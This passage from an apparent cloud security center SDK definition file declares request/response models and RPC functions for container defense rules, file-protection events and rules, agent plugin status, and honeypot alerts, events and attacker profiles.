  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListContainerDefenseRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListContainerDefenseRuleResponseBody(name='body'),
}

async function listContainerDefenseRule(request: ListContainerDefenseRuleRequest): ListContainerDefenseRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListContainerDefenseRule', 'POST', '/', 'json', false, 'json', request);
}

model ListContainerDefenseRuleClustersRequest {
}

model ListContainerDefenseRuleClustersResponseBody = {
  clusterList?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Indicates whether all namespaces are included. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
      ruleId?: long(name='RuleId'),
    }
  ](name='ClusterList', description='The clusters.'),
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='1'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='1F995515-CAF3-5F84-8D82-C9F706AD5070'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListContainerDefenseRuleClustersResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListContainerDefenseRuleClustersResponseBody(name='body'),
}

async function listContainerDefenseRuleClusters(request: ListContainerDefenseRuleClustersRequest): ListContainerDefenseRuleClustersResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListContainerDefenseRuleClusters', 'POST', '/', 'json', false, 'json', request);
}

model ListCriteriaStrategyRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****', position='Query'),
  imageName?: string(name='ImageName', description='The name of the image.

>  You can call the [GetOpaClusterImageList](~~GetOpaClusterImageList~~) operation to query the names of images.', example='testImage', position='Query'),
  label?: string(name='Label', description='The tag that is added to the container.

>  You can call the [GetOpaClusterLabelList](~~GetOpaClusterLabelList~~) operation to query the tags that are added to containers.', example='testlabel', position='Query'),
  namespace?: string(name='Namespace', description='The namespace of the cluster.

>  You can call the [GetOpaClusterNamespaceList](~~GetOpaClusterNamespaceList~~) operation to query the namespaces of clusters.', example='test', position='Query'),
  strategyName?: string(name='StrategyName', description='The name of the rule.', example='test', position='Query'),
}

model ListCriteriaStrategyResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      id?: long(name='Id', description='The unique identifier of the rule.', example='test'),
      value?: string(name='Value', description='The name of the rule.', example='test'),
    }
  ](name='Data', description='The IDs and names of the rules.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='835851E3-AFA2-5EA7-93E9-4FC9BCF3F973'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListCriteriaStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCriteriaStrategyResponseBody(name='body'),
}

async function listCriteriaStrategy(request: ListCriteriaStrategyRequest): ListCriteriaStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCriteriaStrategy', 'POST', '/', 'json', false, 'json', request);
}

model ListFileProtectEventRequest {
  alertLevels?: [ int32 ](name='AlertLevels', description='The severities of alerts.', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1', minimum=1, position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries per page.', example='20', minLength=1, maxLength=100, position='Query'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1', position='Query'),
  status?: string(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled
*   2: added to the whitelist', example='2', position='Query'),
}

model ListFileProtectEventResponseBody = {
  eventList?: [ 
    {
      alertLevel?: int32(name='AlertLevel', description='The severity of the alert. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='1'),
      cmdLine?: string(name='CmdLine', description='The command line of the event.', example='["touch","/test/aaaa"]'),
      filePath?: string(name='FilePath', description='The path to the file.', example='/etc/pam.d/su'),
      handleTime?: long(name='HandleTime', description='The time when the event was handled.', example='1694576692000'),
      id?: long(name='Id', description='The ID of the event.', example='161757'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='kyy-admin-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='121.40.211.194'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.22.5.36'),
      latestTime?: long(name='LatestTime', description='The time when the event last occurred.', example='1694576692000'),
      operation?: string(name='Operation', description='The operation performed by the process on the file.', example='DELETE'),
      procPath?: string(name='ProcPath', description='The path to the process.', example='/usr/bin/sshpass'),
      procPermission?: string(name='ProcPermission', description='The permissions required to start the process.', example='rwxr-xr-x'),
      processId?: string(name='ProcessId', description='The process ID (PID) of the event process.', example='52636'),
      remark?: string(name='Remark', description='The remarks.', example='test'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1'),
      status?: int32(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled
*   2: added to the whitelist', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server that is associated with the process.', example='94b44720-d982-4d20-a4e1-80a1a57b5a8e'),
    }
  ](name='EventList', description='The events.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
}

model ListFileProtectEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListFileProtectEventResponseBody(name='body'),
}

async function listFileProtectEvent(request: ListFileProtectEventRequest): ListFileProtectEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListFileProtectEvent', 'POST', '/', 'json', false, 'json', request);
}

model ListFileProtectPluginStatusRequest {
  currentPage?: long(name='CurrentPage', description='The page number.', example='1', minimum=1, position='Query'),
  pageSize?: long(name='PageSize', description='The number of entries per page.', example='10', minimum=1, maximum=100, position='Query'),
  switchId?: string(name='SwitchId', description='The ID of the core file monitoring rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_1693474122927', position='Query'),
}

model ListFileProtectPluginStatusResponseBody = {
  data?: [ 
    {
      clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='00_41'),
      installCode?: string(name='InstallCode', description='The returned code after you install the Security Center agent. Valid values:

1.  0: The installation is successful.
2.  \\-2: The kernel does not support the installation.', example='-2'),
      installMessage?: string(name='InstallMessage', description='The returned message after you install the Security Center agent.', example='driver file not exist'),
      installed?: boolean(name='Installed', description='Indicates whether the Security Center agent is installed.', example='true'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
      internetIp?: string(name='InternetIp', description='The public IP address that is associated with the instance.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address that is associated with the instance.', example='10.42.XX.XX'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid value:

*   **true**
*   **false**', example='true'),
      supportFile?: boolean(name='SupportFile', description='Indicates whether the core file monitoring file is supported.', example='true'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The data returned if the call is successful.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='60F289EC-BAA3-5DF1-8476-B3F05A14EBC2'),
}

model ListFileProtectPluginStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListFileProtectPluginStatusResponseBody(name='body'),
}

async function listFileProtectPluginStatus(request: ListFileProtectPluginStatusRequest): ListFileProtectPluginStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListFileProtectPluginStatus', 'POST', '/', 'json', false, 'json', request);
}

model ListFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1', minimum=1, position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10', minimum=1, maximum=100, position='Query'),
  ruleAction?: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass', position='Query'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-1', position='Query'),
}

model ListFileProtectRuleResponseBody = {
  fileProtectList?: [ 
    {
      action?: string(name='Action', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass'),
      alertLevel?: string(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
      effectInstanceCount?: long(name='EffectInstanceCount', description='The total number of affected assets.', example='12'),
      fileOps?: [ string ](name='FileOps', description='The operations performed on the files.'),
      filePaths?: [ string ](name='FilePaths', description='The paths to the monitored files. Wildcard characters are supported.'),
      gmtCreate?: long(name='GmtCreate', description='The time when the rule was created.', example='1682304179000'),
      gmtModified?: long(name='GmtModified', description='The time when the rule was last modified.', example='1682304179000'),
      id?: long(name='Id', description='The ID of the rule.', example='1412511'),
      procPaths?: [ string ](name='ProcPaths', description='The paths to the monitored processes. Wildcard characters are supported.'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test11'),
      status?: int32(name='Status', description='The status of the rule. Valid values:

*   0: disabled
*   1: enabled', example='1'),
      switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_1693474122927'),
    }
  ](name='FileProtectList', description='The details of returned data.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model ListFileProtectRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListFileProtectRuleResponseBody(name='body'),
}

async function listFileProtectRule(request: ListFileProtectRuleRequest): ListFileProtectRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListFileProtectRule', 'POST', '/', 'json', false, 'json', request);
}

model ListGroupsRequest {
  currentPage?: int32(name='CurrentPage', example='89', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  nextToken?: string(name='NextToken', example='1426C575705AE8545E8360A6EFA3B***', position='Query'),
  pageSize?: int32(name='PageSize', example='10', position='Query'),
  useNextToken?: boolean(name='UseNextToken', example='true', position='Query'),
}

model ListGroupsResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  list?: [ 
    {
      groupFlag?: int32(name='GroupFlag', example='1'),
      groupId?: long(name='GroupId', example='11028542'),
      groupName?: string(name='GroupName', example='cn-shenzhen+dir-1440978***'),
    }
  ](name='List'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    nextToken?: string(name='NextToken', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', example='10'),
    totalCount?: int32(name='TotalCount', example='202'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='CB414DB5-F692-5DAB-9F0F-975C060AF***'),
  success?: boolean(name='Success', example='true'),
}

model ListGroupsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListGroupsResponseBody(name='body'),
}

async function listGroups(request: ListGroupsRequest): ListGroupsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListGroups', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  honeypotIds?: [ string ](name='HoneypotIds', description='The IDs of the honeypots.', position='Query'),
  honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi', position='Query'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****', position='Query'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='honeypot_master', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
}

model ListHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='0804-pre'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='76c2a1c72ef259777d96d55a7834e5f5d98f85666c49f76ad9caa447d8b7****'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='MongoDB'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the honeypot image.', example='sha256:eca5ced3757e46c24701e9ced4e652f2d730262d5685a4e001da22c4fb418fd4'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509b117'),
      presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
      state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
    }
  ](name='List', description='An array that consists of the information about the honeypots.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C80AFF1F-CC20-502C-A4D4-F5433E529B69'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotResponseBody(name='body'),
}

async function listHoneypot(request: ListHoneypotRequest): ListHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotAlarmEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='10', position='Body'),
  dealed?: string(name='Dealed', description='The status of the alert events. Valid values:

*   **y**: handled
*   **n**: unhandled
*   **a**: all states', example='n', position='Body'),
  dstIp?: string(name='DstIp', description='The destination IP address.', example='172.20.XX.XX', position='Body'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **100**', example='10', position='Body'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels of the alert events.', position='Body'),
  srcIp?: string(name='SrcIp', description='The source IP address.', example='101.132.XX.XX', position='Body'),
}

model ListHoneypotAlarmEventsResponseBody = {
  honeypotAlarmEvents?: [ 
    {
      alarmEventId?: long(name='AlarmEventId', description='The event ID.', example='940272'),
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='Attack Honeypot'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Initial Access'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.', example='167e6fc0d931917d2059efcd1d00f6ab'),
      eventCount?: int32(name='EventCount', description='The total number of times that the alert event was generated.', example='11'),
      firstTime?: long(name='FirstTime', description='The timestamp that indicates the time when the alert event was first detected. Unit: milliseconds.', example='1658193602000'),
      lastTime?: long(name='LastTime', description='The timestamp that indicates the time when the alert event was last detected. Unit: milliseconds.', example='1660610772000'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo', description='The extended value that corresponds to the field key.', example='dest_ip_ext'),
          fieldKey?: string(name='FieldKey', description='The key of the field.', example='dest_ip_count'),
          fieldType?: string(name='FieldType', description='The type of the field. You can ignore this internal parameter.', example='level1_item3'),
          fieldValue?: string(name='FieldValue', description='The value that corresponds to the field key.', example='1'),
        }
      ](name='MergeFieldList', description='The risk information.'),
      operateStatus?: int32(name='OperateStatus', description='The handling status of the alert event. Valid values:

*   **1**: pending
*   **2**: ignored
*   **4**: confirmed', example='1'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='2'),
    }
  ](name='HoneypotAlarmEvents', description='The alert events.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 100.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='513C9554-55A4-5504-B7C4-6E17EB4FC7A3'),
}

model ListHoneypotAlarmEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAlarmEventsResponseBody(name='body'),
}

async function listHoneypotAlarmEvents(request: ListHoneypotAlarmEventsRequest): ListHoneypotAlarmEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotAlarmEvents', 'GET', '/', 'json', true, 'form', request);
}

model ListHoneypotAttackerPortraitRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  endTimeStamp?: long(name='EndTimeStamp', example='1672285044000', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  srcIp?: string(name='SrcIp', example='101.133.155.***', position='Query'),
  startTimeStamp?: long(name='StartTimeStamp', example='1672249044000', position='Query'),
}

model ListHoneypotAttackerPortraitResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  list?: [ 
    {
      attackCount?: int32(name='AttackCount', example='10'),
      browser?: [ string ](name='Browser'),
      host?: [ string ](name='Host'),
      lastTime?: long(name='LastTime', example='1679896965'),
      network?: {
        externalIp?: [ string ](name='ExternalIp'),
        internalIp?: [ string ](name='InternalIp'),
        realIp?: [ string ](name='RealIp'),
      }(name='Network'),
      portraitId?: string(name='PortraitId', example='cd48604a-1694-4f03-ade0-ec6994c3****'),
      social?: [ string ](name='Social'),
    }
  ](name='List'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='11'),
    currentPage?: int32(name='CurrentPage', example='2'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='25'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='8A5A2DA6-67EA-5968-960F-6B20FD0C*****'),
  success?: boolean(name='Success', example='true'),
}

model ListHoneypotAttackerPortraitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAttackerPortraitResponseBody(name='body'),
}

async function listHoneypotAttackerPortrait(request: ListHoneypotAttackerPortraitRequest): ListHoneypotAttackerPortraitResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotAttackerPortrait', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotAttackerSourceRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  endTimeStamp?: long(name='EndTimeStamp', example='1676945366221', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  riskLevelList?: [ string ](name='RiskLevelList', position='Query'),
  srcIp?: string(name='SrcIp', example='175.136.230.***', position='Query'),
  startTimeStamp?: long(name='StartTimeStamp', example='1674007632124', position='Query'),
}

model ListHoneypotAttackerSourceResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  list?: [ 
    {
      eventCount?: int32(name='EventCount', example='30'),
      lastTargetHoneypot?: string(name='LastTargetHoneypot'),
      lastTargetIp?: string(name='LastTargetIp', example='144.23.66.***'),
      lastTime?: long(name='LastTime', example='1693446913000'),
      riskLevel?: string(name='RiskLevel', example='2'),
      srcIp?: string(name='SrcIp', example='101.102.61.***'),
    }
  ](name='List'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='55'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='9915DC4D-B4DA-5140-8138-FD80636*****'),
  success?: boolean(name='Success', example='true'),
}

model ListHoneypotAttackerSourceResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAttackerSourceResponseBody(name='body'),
}

async function listHoneypotAttackerSource(request: ListHoneypotAttackerSourceRequest): ListHoneypotAttackerSourceResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotAttackerSource', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotEventFlowsRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Body'),
  dealed?: string(name='Dealed', example='n', position='Body'),
  lang?: string(name='Lang', example='zh', position='Body'),
  pageSize?: int32(name='PageSize', example='20', position='Body'),
  requestId?: string(name='RequestId', example='20540822-520E-54F5-B7E6-236CF1EC987F', position='Body'),
  securityEventId?: long(name='SecurityEventId', example='7455818', position='Body'),
}

model ListHoneypotEventFlowsResponseBody = {
  code?: string(name='Code', example='200'),
  honeypotEventFlows?: [ 
    {
      agentId?: string(name='AgentId', example='d3c0dafa-5059-4eb0-8c28-7d40f58*****'),
      agentName?: string(name='AgentName', example='hw-d***'),
      dockerId?: string(name='DockerId', example='eca09895****'),
      dstIp?: string(name='DstIp', example='112.126.205.***'),
      dstPort?: int32(name='DstPort', example='80'),
      eventConnection?: string(name='EventConnection', example='fd7f1ff4-0c4b-41cb-99ad-0724349d****'),
      extra?: string(name='Extra'),
      extra1?: string(name='Extra1', example='{\\"vpc_id\\":\\"\\",\\"vpc_dest_port\\":\\"\\",\\"vpc_dest_ip\\":\\"\\"}'),
      fileOssUrl?: string(name='FileOssUrl', example='https://pop-test-file-upload.oss-cn-beijing.aliyuncs.com/5626_26331*****'),
      firstTime?: long(name='FirstTime', example='1686621122000'),
      honeypotEventId?: string(name='HoneypotEventId', example='19bec028-d98b-45c4-a4d9-cc3d593f****'),
      honeypotId?: string(name='HoneypotId', example='911df9d6fe20451c059edbcffa1d1c33452f6a71e59d4826da067af224*****'),
      honeypotName?: string(name='HoneypotName', example='hw-zhi*****'),
      lastTime?: long(name='LastTime', example='1686622222000'),
      riskLevel?: string(name='RiskLevel', example='4'),
      securityEventId?: long(name='SecurityEventId', example='306527555'),
      srcIp?: string(name='SrcIp', example='121.41.48.***'),
      srcMac?: string(name='SrcMac', example='00:0C:29:CA:**:**'),
      srcPort?: int32(name='SrcPort', example='80'),
      status?: int32(name='Status', example='1'),
      typeId?: string(name='TypeId', example='web_access'),
      uid?: string(name='Uid', example='5fa2ece9-aa08-4bbd-a272-5d27d1c6*****'),
    }
  ](name='HoneypotEventFlows'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='78'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='9F4E6157-9600-5588-86B9-38F09067****'),
  success?: boolean(name='Success', example='true'),
}

model ListHoneypotEventFlowsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotEventFlowsResponseBody(name='body'),
}

async function listHoneypotEventFlows(request: ListHoneypotEventFlowsRequest): ListHoneypotEventFlowsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotEventFlows', 'GET', '/', 'json', true, 'form', request);
}

model ListHoneypotEventsRequest {
  agentIdList?: [ string ](name='AgentIdList', description='The probe IDs.', position='Body'),
  alarmEventId?: long(name='AlarmEventId', description='The ID of the alert.', example='1259925', position='Body'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1', position='Body'),
  dealed?: string(name='Dealed', description='The status of the event. Valid values:

*   **y**: handled
*   **n**: unhandled
*   **a**: all statuses', example='y', position='Body'),
  honeypotIdList?: [ string ](name='HoneypotIdList', description='The honeypot IDs.', position='Body'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Body'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='10', position='Body'),
  portraitId?: string(name='PortraitId', description='The ID of the attacker profile.', example='cd48604a-1694-4f03-ade0-ec6994c3*****', position='Query'),
  requestId?: string(name='RequestId', description='The request ID.', example='2F9CE167-58D5-5DA6-AA3B-923EED02****', position='Body'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels.', position='Body'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='185.237.96.***', position='Query'),
}

model ListHoneypotEventsResponseBody = {
  honeypotEvents?: [ 
    {
      agentId?: string(name='AgentId', description='The probe ID.', example='27d44bd5815d401992ea672874d9****'),
      agentName?: string(name='AgentName', description='The name of the probe.', example='1193474_test_****'),
      alarmEventId?: long(name='AlarmEventId', description='The ID of the alert event.', example='1900752'),
      dstIp?: string(name='DstIp', description='The destination IP address of the attack.', example='112.126.205.***'),
      firstTime?: long(name='FirstTime', description='The timestamp at which the event was first detected.', example='1692670297'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='honeypot-2'),
      lastTime?: long(name='LastTime', description='The timestamp at which the event was last detected.', example='1676558664'),
      location?: string(name='Location', description='The region.', example='China Beijing'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo', description='The supplementary information about the field.', example='data'),
          fieldKey?: string(name='FieldKey', description='The key of the field.', example='type'),
          fieldType?: string(name='FieldType', description='The type of the field.', example='level2_item1'),
          fieldValue?: string(name='FieldValue', description='The value of the field key.', example='web_access'),
        }
      ](name='MergeFieldList', description='The extended values that correspond to the field key.'),
      protocol?: string(name='Protocol', description='The protocol. Valid values:

*   **tcp**
*   **udp**', example='tcp'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='4'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the intrusion event.', example='70427821'),
      srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='192.168.62.***'),
    }
  ](name='HoneypotEvents', description='The intrusion events.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY*********'),
    nextToken?: string(name='NextToken', description='The value of the NextToken parameter that is returned by using the NextToken method.', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FBD28009-6096-5E90-BFE6-62CCD67*****'),
}

model ListHoneypotEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotEventsResponseBody(name='body'),
}

async function listHoneypotEvents(request: ListHoneypotEventsRequest): ListHoneypotEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotEvents', 'GET', '/', 'json', true, 'form', request);
}

model ListHoneypotNodeRequest {
